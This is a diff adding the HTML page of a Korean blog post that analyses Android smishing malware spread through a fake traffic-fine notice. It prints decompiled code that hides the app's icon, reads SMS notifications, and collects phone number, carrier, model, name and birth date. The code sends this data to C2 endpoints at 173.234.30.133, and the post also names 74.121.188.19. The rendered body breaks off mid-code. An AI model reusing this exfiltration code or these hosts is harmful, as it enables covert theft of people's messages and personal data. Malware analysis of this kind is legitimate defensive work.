@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Android Malware Analysis | msh1307</title>
+<meta name="keywords" content="malware, Android malware">
+<meta name="description" content="Overview 운전면허도 없는데, 고지서가 발부되었다길래 궁금해서 분석해보았다.
+잠깐 본거라 분석은 많이 안했는데, 중요한건 대충 다 한 것 같다.
+미리 요약하자면 이 앱은 통신사, 전화번호, 폰 모델명 같은 것들을 탈취해서 173.234.30.133로 열심히 보내고 문자 메세지 내용이나 타이틀을 수집해서 그대로 서버로 보낸다.
+또한 앱을 키면, 대놓고 이름과 생년월일도 친절하게 묻는다.
+C2 서버에 접속해보면 저렇게 admin page를 열어두고 있다.
+저기뿐만 아니라 74.121.188.19 같은 곳에서도 같은 페이지가 열려있다.
+sms-serverV2-name_password 라는 laravel로 만든 자기들만의 php 프로젝트로 보인다.">
+<meta name="author" content="">
+<link rel="canonical" href="https://msh1307.kr/blog/gojiseo/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.min.d9c43e0c7cae3b38c51e79921ad3cf2685d9811a56593a817d9b57ac4fdebf2b.css" integrity="sha256-2cQ&#43;DHyuOzjFHnmSGtPPJoXZgRpWWTqBfZtXrE/evys=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js" integrity="sha256-uVus3DnjejMqn4g7Hni&#43;Srwf3KK8HyZB9V4809q9TWE="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
+<script>
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-BR89V2WEC0');
+</script>
+<link rel="icon" href="https://msh1307.kr/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://msh1307.kr/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://msh1307.kr/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://msh1307.kr/apple-touch-icon.png">
+<link rel="mask-icon" href="https://msh1307.kr/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Android Malware Analysis" />
+<meta property="og:description" content="Overview 운전면허도 없는데, 고지서가 발부되었다길래 궁금해서 분석해보았다.
+잠깐 본거라 분석은 많이 안했는데, 중요한건 대충 다 한 것 같다.
+미리 요약하자면 이 앱은 통신사, 전화번호, 폰 모델명 같은 것들을 탈취해서 173.234.30.133로 열심히 보내고 문자 메세지 내용이나 타이틀을 수집해서 그대로 서버로 보낸다.
+또한 앱을 키면, 대놓고 이름과 생년월일도 친절하게 묻는다.
+C2 서버에 접속해보면 저렇게 admin page를 열어두고 있다.
+저기뿐만 아니라 74.121.188.19 같은 곳에서도 같은 페이지가 열려있다.
+sms-serverV2-name_password 라는 laravel로 만든 자기들만의 php 프로젝트로 보인다." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://msh1307.kr/blog/gojiseo/" /><meta property="article:section" content="blog" />
+<meta property="article:published_time" content="2025-06-17T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2025-06-17T00:00:00&#43;00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Android Malware Analysis"/>
+<meta name="twitter:description" content="Overview 운전면허도 없는데, 고지서가 발부되었다길래 궁금해서 분석해보았다.
+잠깐 본거라 분석은 많이 안했는데, 중요한건 대충 다 한 것 같다.
+미리 요약하자면 이 앱은 통신사, 전화번호, 폰 모델명 같은 것들을 탈취해서 173.234.30.133로 열심히 보내고 문자 메세지 내용이나 타이틀을 수집해서 그대로 서버로 보낸다.
+또한 앱을 키면, 대놓고 이름과 생년월일도 친절하게 묻는다.
+C2 서버에 접속해보면 저렇게 admin page를 열어두고 있다.
+저기뿐만 아니라 74.121.188.19 같은 곳에서도 같은 페이지가 열려있다.
+sms-serverV2-name_password 라는 laravel로 만든 자기들만의 php 프로젝트로 보인다."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Blogs",
+      "item": "https://msh1307.kr/blog/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "Android Malware Analysis",
+      "item": "https://msh1307.kr/blog/gojiseo/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Android Malware Analysis",
+  "name": "Android Malware Analysis",
+  "description": "Overview 운전면허도 없는데, 고지서가 발부되었다길래 궁금해서 분석해보았다.\n잠깐 본거라 분석은 많이 안했는데, 중요한건 대충 다 한 것 같다.\n미리 요약하자면 이 앱은 통신사, 전화번호, 폰 모델명 같은 것들을 탈취해서 173.234.30.133로 열심히 보내고 문자 메세지 내용이나 타이틀을 수집해서 그대로 서버로 보낸다.\n또한 앱을 키면, 대놓고 이름과 생년월일도 친절하게 묻는다.\nC2 서버에 접속해보면 저렇게 admin page를 열어두고 있다.\n저기뿐만 아니라 74.121.188.19 같은 곳에서도 같은 페이지가 열려있다.\nsms-serverV2-name_password 라는 laravel로 만든 자기들만의 php 프로젝트로 보인다.",
+  "keywords": [
+    "malware", "Android malware"
+  ],
+  "articleBody": "Overview 운전면허도 없는데, 고지서가 발부되었다길래 궁금해서 분석해보았다.\n잠깐 본거라 분석은 많이 안했는데, 중요한건 대충 다 한 것 같다.\n미리 요약하자면 이 앱은 통신사, 전화번호, 폰 모델명 같은 것들을 탈취해서 173.234.30.133로 열심히 보내고 문자 메세지 내용이나 타이틀을 수집해서 그대로 서버로 보낸다.\n또한 앱을 키면, 대놓고 이름과 생년월일도 친절하게 묻는다.\nC2 서버에 접속해보면 저렇게 admin page를 열어두고 있다.\n저기뿐만 아니라 74.121.188.19 같은 곳에서도 같은 페이지가 열려있다.\nsms-serverV2-name_password 라는 laravel로 만든 자기들만의 php 프로젝트로 보인다.\n앱에서 분석한 엔드포인트에 들어가보면 이런식으로 stack trace도 보여준다. ㅋㅋ\n뭔가 취약점 많을 것 같이 생겼지만 원래 목적에는 벗어난다.\nAnalysis [...] \u003cuses-permission android:name=\"android.permission.READ_PHONE_STATE\"/\u003e \u003cuses-permission android:name=\"android.permission.READ_PHONE_NUMBERS\"/\u003e \u003cuses-permission android:name=\"android.permission.BIND_NOTIFICATION_LISTENER_SERVICE\"/\u003e [...] \u003cactivity-alias android:label=\".\" android:icon=\"@android:color/transparent\" android:name=\"com.sagm.zwclfwip.VgBq\" android:enabled=\"false\" android:exported=\"true\" android:targetActivity=\"com.sagm.zwclfwip.VgBq\"\u003e \u003cintent-filter\u003e \u003caction android:name=\"android.intent.action.MAIN\"/\u003e \u003ccategory android:name=\"android.intent.category.LAUNCHER\"/\u003e \u003c/intent-filter\u003e \u003c/activity-alias\u003e [...] \u003cservice android:label=\"@string/app_name\" android:name=\"com.sagm.zwclfwip.spWRVMyKFJ.EmIyzOjRW\" android:permission=\"android.permission.BIND_NOTIFICATION_LISTENER_SERVICE\" android:exported=\"false\"\u003e \u003cintent-filter\u003e \u003caction android:name=\"android.service.notification.NotificationListenerService\"/\u003e \u003c/intent-filter\u003e \u003c/service\u003e [...] 되게 악랄하게 투명 색깔을 선택하고 있다.\n이 앱 자체는 적당히 난독화 되어 있긴 하지만 기능이 간단해서 분석하기 쉽다.\nNotificationListenerServic - updateUserMsg 사실 이 리스너가 주요한 기능인 것으로 보인다.\nandroid.permission.BIND_NOTIFICATION_LISTENER_SERVICE가 허용되어 있어야 동작해서 처음에 main activity에서 권한 허용해달라고 요청한다.\npublic final void onNotificationPosted(StatusBarNotification sbn) { string.copy(sbn, \"sbn\"); super.onNotificationPosted(sbn); String packageName = sbn.getPackageName(); if (string.requals(packageName, \"com.android.mms\") || string.requals(packageName, \"com.samsung.android.messaging\") || string.requals(packageName, \"com.google.android.apps.messaging\")) { Bundle bundle = sbn.getNotification().extras; String title = bundle.getString(NotificationCompat.EXTRA_TITLE); if (title == null) { title = \"\"; } String string = bundle.getString(NotificationCompat.EXTRA_TEXT); String content = string != null ? string : \"\"; if (ZHbVuIv.TEUYb(\"메세지\", content) || ZHbVuIv.TEUYb(\"문자\", content) || ZHbVuIv.TEUYb(\"sms\", content)) { return; } long currentTimeMillis = System.currentTimeMillis(); String msg = \"收到短信通知: 标题=\" + title + \", 内容=\" + content; // \"문자 메시지 알림 수신: 제목=\", \", 내용=\" string.copy(msg, \"msg\"); CustomLogger.log(3, \"SmsNotificationListener\", msg, null); Map pack_data = mSzUY.pack_data(new XZD.ZHbVuIv(\"description\", content), new XZD.ZHbVuIv(\"type\", 1), new XZD.ZHbVuIv(\"phone\", title), new XZD.ZHbVuIv(\"send_time\", Long.valueOf(currentTimeMillis)), new XZD.ZHbVuIv(\"id\", -1), new XZD.ZHbVuIv(\"is_color\", 0)); JSONArray jSONArray = new JSONArray(); jSONArray.put(new JSONObject(pack_data)); String jSONArray2 = jSONArray.toString(); string.call(jSONArray2, \"toString(...)\"); MMKV mmkv = GfKxQHQ.wmbNnZ; if (mmkv == null) { string.wiX(\"mainMMKV\"); throw null; } String decodeString = mmkv.decodeString(\"uuid\"); if (decodeString == null || decodeString.length() == 0) { decodeString = UUID.randomUUID().toString(); string.call(decodeString, \"toString(...)\"); MMKV mmkv2 = GfKxQHQ.wmbNnZ; if (mmkv2 == null) { string.wiX(\"mainMMKV\"); throw null; } mmkv2.encode(\"uuid\", decodeString); } Map pack_data2 = mSzUY.pack_data(new XZD.ZHbVuIv(\"uuid\", decodeString), new XZD.ZHbVuIv(\"data\", jSONArray2)); FftZ fftZ = FHL.ifwfG; FHL.SEND(C2_URL_GEN.update_user_msg, pack_data2, new AwNbFoW.ZHbVuIv(2)); // SEND AwNbFoW.ZHbVuIv.ifwfG(); [...] EmIyzOjRW 클래스는 이런식으로 문자 메세지를 열심히 기록한다.\n그래서 문자 title, content를 분리해서 중국어로 로그를 찍는 것을 확인할 수 있다.\n약간 title 같은데 발신자 정보가 들어가니까 그걸로 주변 사람들의 전화번호를 수집하려는 목적도 있어 보인다.\n각자 폰마다 uuid를 부여해서 C2 서버로 보내는 것을 확인할 수 있다.\npackage GNXEC; import nvf.HRhLr; /* renamed from: GNXEC.FHL */ /* loaded from: classes.dex */ public abstract class C2_URL_GEN { /* renamed from: EKRSx */ public static final String update_user_msg; /* renamed from: RhN */ public static final String update_user_notes; /* renamed from: ifwfG */ public static final String update_user_long; static { String obj = nvf.ZHbVuIv.HkbDkTL(\"http://173.234.30.133\").toString(); if (!HRhLr.Aztjigt(obj, \"http://\", false) \u0026\u0026 !HRhLr.Aztjigt(obj, \"https://\", false)) { obj = \"http://\".concat(obj); } if (!HRhLr.mgA(obj, \"/\")) { obj = obj.concat(\"/\"); } update_user_long = QFMtNe.GfKxQHQ.UMEwxCp(obj, \"updateUserLong\"); update_user_notes = QFMtNe.GfKxQHQ.UMEwxCp(obj, \"updateUserNotes\"); update_user_msg = QFMtNe.GfKxQHQ.UMEwxCp(obj, \"updateUserMsg\"); } 이게 C2랑 통신하기 전에 URL을 만드는 클래스이다.\nmessage listener 등록된거에서 수집된 정보는 updateUserMsg 엔드포인트로 POST로 날아간다.\nMainActivity updateUserNotes @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity public final void onCreate(Bundle bundle) { super.onCreate(bundle); EdgeToEdge.enable$default(this, null, null, 3, null); setContentView(R.layout.activity_main); ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), new GfKxQHQ(10)); ((Button) findViewById(R.id.nkzagw)).setOnClickListener(new okn(this, 1)); } 클릭 리스너를 등록한다.\n} else { try { ((FrameLayout) mainActivity.findViewById(R.id.egaqflmvpsuwvv)).setVisibility(0); } catch (Exception unused) { } if (GNXEC.GfKxQHQ.RhN()) { Map map = AwNbFoW.ZHbVuIv.get_user_data(); Map pack_data = mSzUY.pack_data(new XZD.ZHbVuIv(\"name\", NAME), new XZD.ZHbVuIv(\"birth\", BIRTH)); LinkedHashMap linkedHashMap = new LinkedHashMap(map); linkedHashMap.putAll(pack_data); FftZ fftZ = sjR.FHL.ifwfG; sjR.FHL.SEND(C2_URL_GEN.update_user_notes, linkedHashMap, new AwNbFoW.ZHbVuIv(3)); return; } return; } birth 길이가 6글자 이상인 것만 받도록 되어 있는데, 위와 같이 이름이랑 생년월일 수집해서 updateUserNotes 엔드포인트로 보낸다.\nupdateUserLong public final void onResume() { super.onResume(); [...] TiVm tiVm2 = TiVm.ifwfG; if (jhLoO.okn.GAfXIJ(FHL.wiX())) { // notification listener ON or OFF? getPackageManager().setComponentEnabledSetting(new ComponentName(this, EmIyzOjRW.class), 1, 1); if (GNXEC.GfKxQHQ.RhN()) { Map map = ZHbVuIv.get_user_data(); FftZ fftZ = sjR.FHL.ifwfG; sjR.FHL.SEND(C2_URL_GEN.update_user_long, map, new ZHbVuIv(1)); } this.ifwfG = true; CGLZX(); return; } String string = getString(R.string.app_name); string.call(string, \"getString(...)\"); if (jhLoO.okn.GAfXIJ(this)) { return; } Toast.makeText(this, string.concat(\"을 찾아 알림 접근을 허용해 주세요.\"), 1).show(); Intent intent = new Intent(\"android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS\"); intent.setFlags(268435456); startActivity(intent); } 여기서 중요한건 get_user_data로 라벨링 해놓은 메소드이다.\npublic static Map get_user_data() { [...] XZD.ZHbVuIv zHbVuIv = new XZD.ZHbVuIv(\"uuid\", decodeString); XZD.ZHbVuIv zHbVuIv2 = new XZD.ZHbVuIv(\"number\", GNXEC.GfKxQHQ.ifwfG()); if (GNXEC.GfKxQHQ.sUJ.length() == 0) { TiVm tiVm = TiVm.ifwfG; Object systemService = VqO.FHL.wiX().getSystemService(\"phone\"); string.EKRSx(systemService, \"null cannot be cast to non-null type android.telephony.TelephonyManager\"); GNXEC.GfKxQHQ.sUJ = ((TelephonyManager) systemService).getNetworkOperatorName(); } XZD.ZHbVuIv zHbVuIv3 = new XZD.ZHbVuIv(\"operator\", GNXEC.GfKxQHQ.sUJ); String MODEL = Build.MODEL; string.call(MODEL, \"MODEL\"); XZD.ZHbVuIv zHbVuIv4 = new XZD.ZHbVuIv(\"phone_type\", MODEL); String[] strArr = GNXEC.GfKxQHQ.RhN; int i3 = 0; while (true) { if (i3 \u003e= 2) { i = 1; break; } String str = strArr[i3]; TiVm tiVm2 = TiVm.ifwfG; if (ContextCompat.checkSelfPermission(VqO.FHL.wiX(), str) != 0) { i = 0; break; } i3++; } XZD.ZHbVuIv zHbVuIv5 = new XZD.ZHbVuIv(\"phone\", Integer.valueOf(i)); TiVm tiVm3 = TiVm.ifwfG; XZD.ZHbVuIv zHbVuIv6 = new XZD.ZHbVuIv(\"sms\", Integer.valueOf(okn.GAfXIJ(VqO.FHL.wiX()) ? 1 : 0)); XZD.ZHbVuIv zHbVuIv7 = new XZD.ZHbVuIv(\"contacts\", 0); XZD.ZHbVuIv zHbVuIv8 = new XZD.ZHbVuIv(\"image\", 0); Object systemService2 = VqO.FHL.wiX().getSystemService(\"connectivity\"); string.EKRSx(systemService2, \"null cannot be cast to non-null type android.net.ConnectivityManager\"); ConnectivityManager connectivityManager = (ConnectivityManager) systemService2; if (connectivityManager.isActiveNetworkMetered() \u0026\u0026 connectivityManager.getRestrictBackgroundStatus() == 3) { i2 = 0; } XZD.ZHbVuIv zHbVuIv9 = new XZD.ZHbVuIv(\"empower\", mSzUY.pack_data(zHbVuIv5, zHbVuIv6, zHbVuIv7, zHbVuIv8, new XZD.ZHbVuIv(\"network\", Integer.valueOf(i2)), new XZD.ZHbVuIv(\"accessibility\", 0), new XZD.ZHbVuIv(NotificationCompat.CATEGORY_MESSAGE, 0), new XZD.ZHbVuIv(\"battery\", 0))); String RELEASE = Build.VERSION.RELEASE; string.call(RELEASE, \"RELEASE\"); return mSzUY.pack_data(zHbVuIv, zHbVuIv2, zHbVuIv3, zHbVuIv4, zHbVuIv9, new XZD.ZHbVuIv(\"android_v\", RELEASE)); } READ_PHONE_STATE 같은 권한이 있으면 전화번호도 읽고, 기기 모델명 같은 여러 정보들을 수집한다.\n전화번호도 가공하는 함수들을 보면 010, 011, 016 이런 prefix 가진 애들을 걸러서 저장하는 것 같다.\n",
+  "wordCount" : "916",
+  "inLanguage": "en",
+  "datePublished": "2025-06-17T00:00:00Z",
+  "dateModified": "2025-06-17T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://msh1307.kr/blog/gojiseo/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "msh1307",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://msh1307.kr/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header sticky-header">
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-BR89V2WEC0');
+    </script>
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://msh1307.kr" accesskey="h" title="msh1307 (Alt + H)">msh1307</a>
+            <span class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://msh1307.kr/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/blog" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/about" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/categories" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://msh1307.kr">Home</a>&nbsp;»&nbsp;<a href="https://msh1307.kr/blog/">Blogs</a></div>
+    <h1 class="post-title">
+      Android Malware Analysis
+    </h1>
+    <div class="post-meta">
+
+
+June 2025
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">‎ Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#overview" aria-label="Overview">Overview</a></li>
+                <li>
+                    <a href="#analysis" aria-label="Analysis">Analysis</a><ul>
+                        
+                <li>
+                    <a href="#notificationlistenerservic---updateusermsg" aria-label="NotificationListenerServic - updateUserMsg">NotificationListenerServic - updateUserMsg</a></li>
+                <li>
+                    <a href="#mainactivity" aria-label="MainActivity">MainActivity</a><ul>
+                        
+                <li>
+                    <a href="#updateusernotes" aria-label="updateUserNotes">updateUserNotes</a></li>
+                <li>
+                    <a href="#updateuserlong" aria-label="updateUserLong">updateUserLong</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h1>
+<p><img loading="lazy" src="/blog/gojiseo/Screenshot_20250617_153131_Messages.jpg" alt=""  />
+</p>
+<p>운전면허도 없는데, 고지서가 발부되었다길래 궁금해서 분석해보았다.<br>
+잠깐 본거라 분석은 많이 안했는데, 중요한건 대충 다 한 것 같다.</p>
+<p>미리 요약하자면 이 앱은 통신사, 전화번호, 폰 모델명 같은 것들을 탈취해서 <code>173.234.30.133</code>로 열심히 보내고 문자 메세지 내용이나 타이틀을 수집해서 그대로 서버로 보낸다.<br>
+또한 앱을 키면, 대놓고 이름과 생년월일도 친절하게 묻는다.</p>
+<p>C2 서버에 접속해보면 저렇게 admin page를 열어두고 있다.<br>
+<img loading="lazy" src="/blog/gojiseo/image.png" alt=""  />
+</p>
+<p>저기뿐만 아니라 <code>74.121.188.19</code> 같은 곳에서도 같은 페이지가 열려있다.<br>
+<img loading="lazy" src="/blog/gojiseo/image-1.png" alt=""  />
+</p>
+<p>sms-serverV2-name_password 라는 laravel로 만든 자기들만의 php 프로젝트로 보인다.</p>
+<p><img loading="lazy" src="/blog/gojiseo/image-2.png" alt=""  />
+</p>
+<p>앱에서 분석한 엔드포인트에 들어가보면 이런식으로 stack trace도 보여준다. ㅋㅋ<br>
+뭔가 취약점 많을 것 같이 생겼지만 원래 목적에는 벗어난다.</p>
+<h1 id="analysis">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis">#</a></h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#f92672">[...]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span>uses<span style="color:#f92672">-</span>permission android<span style="color:#f92672">:</span>name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;android.permission.READ_PHONE_STATE&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span>uses<span style="color:#f92672">-</span>permission android<span style="color:#f92672">:</span>name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;android.permission.READ_PHONE_NUMBERS&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span>uses<span style="color:#f92672">-</span>permission android<span style="color:#f92672">:</span>name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;android.permission.BIND_NOTIFICATION_LISTENER_SERVICE&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[...]</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;</span>activity<span style="color:#f92672">-</span>alias android<span style="color:#f92672">:</span>label<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;.&#34;</span> android<span style="color:#f92672">:</span>icon<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;@android:color/transparent&#34;</span> android<span style="color:#f92672">:</span>name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;com.sagm.zwclfwip.VgBq&#34;</span> android<span style="color:#f92672">:</span>enabled<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> android<span style="color:#f92672">:</span>exported<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;true&#34;</span> android<span style="color:#f92672">:</span>targetActivity<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;com.sagm.zwclfwip.VgBq&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;</span>intent<span style="color:#f92672">-</span>filter<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;</span>action android<span style="color:#f92672">:</span>name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;android.intent.action.MAIN&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;</span>category android<span style="color:#f92672">:</span>name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;android.intent.category.LAUNCHER&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;/</span>intent<span style="color:#f92672">-</span>filter<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/</span>activity<span style="color:#f92672">-</span>alias<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[...]</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;</span>service android<span style="color:#f92672">:</span>label<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;@string/app_name&#34;</span> android<span style="color:#f92672">:</span>name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;com.sagm.zwclfwip.spWRVMyKFJ.EmIyzOjRW&#34;</span> android<span style="color:#f92672">:</span>permission<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;android.permission.BIND_NOTIFICATION_LISTENER_SERVICE&#34;</span> android<span style="color:#f92672">:</span>exported<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;</span>intent<span style="color:#f92672">-</span>filter<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;</span>action android<span style="color:#f92672">:</span>name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;android.service.notification.NotificationListenerService&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;/</span>intent<span style="color:#f92672">-</span>filter<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/</span>service<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[...]</span>
+</span></span></code></pre></div><p>되게 악랄하게 투명 색깔을 선택하고 있다.<br>
+이 앱 자체는 적당히 난독화 되어 있긴 하지만 기능이 간단해서 분석하기 쉽다.</p>
+<h2 id="notificationlistenerservic---updateusermsg">NotificationListenerServic - updateUserMsg<a hidden class="anchor" aria-hidden="true" href="#notificationlistenerservic---updateusermsg">#</a></h2>
+<p>사실 이 리스너가 주요한 기능인 것으로 보인다.<br>
+<code>android.permission.BIND_NOTIFICATION_LISTENER_SERVICE</code>가 허용되어 있어야 동작해서 처음에 main activity에서 권한 허용해달라고 요청한다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onNotificationPosted</span><span style="color:#f92672">(</span>StatusBarNotification sbn<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        string<span style="color:#f92672">.</span><span style="color:#a6e22e">copy</span><span style="color:#f92672">(</span>sbn<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;sbn&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span><span style="color:#f92672">.</span><span style="color:#a6e22e">onNotificationPosted</span><span style="color:#f92672">(</span>sbn<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        String packageName <span style="color:#f92672">=</span> sbn<span style="color:#f92672">.</span><span style="color:#a6e22e">getPackageName</span><span style="color:#f92672">();</span>
